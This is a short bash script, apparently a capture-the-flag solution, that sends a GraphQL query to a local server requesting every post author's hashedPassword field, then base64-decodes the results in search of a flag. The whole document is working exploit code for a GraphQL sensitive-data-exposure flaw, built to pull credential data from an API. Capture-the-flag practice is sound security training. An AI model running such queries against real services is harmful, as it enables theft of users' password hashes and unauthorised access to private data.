echo "CTF Challenge Solver Script"
echo "============================================="

# Execute the GraphQL query directly
RESPONSE=$(curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"query": "{ getAllPosts { author { hashedPassword } } }"}' \
  "http://localhost:8080/graphql")

echo "Response:"
echo "$RESPONSE" | jq '.' 2>/dev/null || echo "$RESPONSE"

echo ""
echo "🔍 Searching for flag in hashed passwords..."

# Extract and decode all hashed passwords to find the flag
echo "$RESPONSE" | jq -r '.data.getAllPosts[].author.hashedPassword' 2>/dev/null | while read -r hash; do
    if [ ! -z "$hash" ] && [ "$hash" != "null" ]; then
        DECODED=$(echo "$hash" | base64 -d 2>/dev/null)
        if [[ "$DECODED" == *"flag{"* ]]; then
            echo "🚩 FLAG FOUND: $DECODED"
            exit 0
        fi
    fi
done